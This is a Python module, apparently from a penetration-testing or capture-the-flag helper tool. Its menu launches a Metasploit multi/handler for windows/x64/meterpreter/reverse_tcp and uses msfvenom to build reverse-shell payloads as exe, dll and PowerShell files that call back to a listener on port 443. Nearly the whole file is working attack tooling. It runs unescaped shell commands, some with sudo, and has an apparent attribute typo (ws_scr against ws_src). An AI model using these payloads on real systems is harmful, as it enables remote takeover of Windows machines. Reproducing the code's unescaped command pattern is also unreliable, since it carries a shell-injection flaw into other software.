import os
import config

def multi_handler(ip, port, output_path):
    print(f"[*] File: {output_path}handler.txt")
    cmd = f"""use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {ip}
set LPORT {port}
set ExitOnSession False
exploit -j"""
    with open(f"{output_path}handler.txt", "w") as f:
        f.write(cmd)
    os.system(f"cat {output_path}handler.txt")
    cmd = f"sudo msfconsole -r {output_path}handler.txt"
    print(f"\n\033[96m[$]\033[0m {cmd}")
    config.log_cmd(cmd)
    os.system(cmd)

def msfvenom_payload(file_type, ip, port, output_path, file_ext=None):
    if not file_ext:
        file_ext = file_type
    cmd = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f {file_type} > {output_path}rshell.{file_ext}"
    print(f"\033[96m[$]\033[0m {cmd}")
    config.log_cmd(cmd)
    os.system(cmd)

def menu(box,path):
    if config.HELP:    
        print("""
Action:\t[Tool] msf
Tool:\tmsfconsole, msfvenom
Option:\t/
Desc:\tOpens a menu to open a handler or create revshell payloads.
Info:\tWrite output files to /src/ or if no box target is present to /tmp/
        """)
        return 0
    if config.get_tun0_ip() != "127.0.0.1":
        ip = "tun0"
    else:
        ip = "127.0.0.1"
    port = "443"
    if path.ws_scr:
        os.chdir(path.ws_src)
        output_path = ""
    else:
        output_path = "/tmp/"
    choice = config.show_menu("MSF", ["start multi/handler", "make exe payload", "make dll payload", "make powershell payload"])
    if choice == 1:
        multi_handler(ip, port, output_path)
    elif choice == 2:
        msfvenom_payload("exe", ip, port, output_path)
    elif choice == 3:
        msfvenom_payload("dll", ip, port, output_path)
    elif choice == 4:
        msfvenom_payload("psh", ip, port, output_path, "ps1")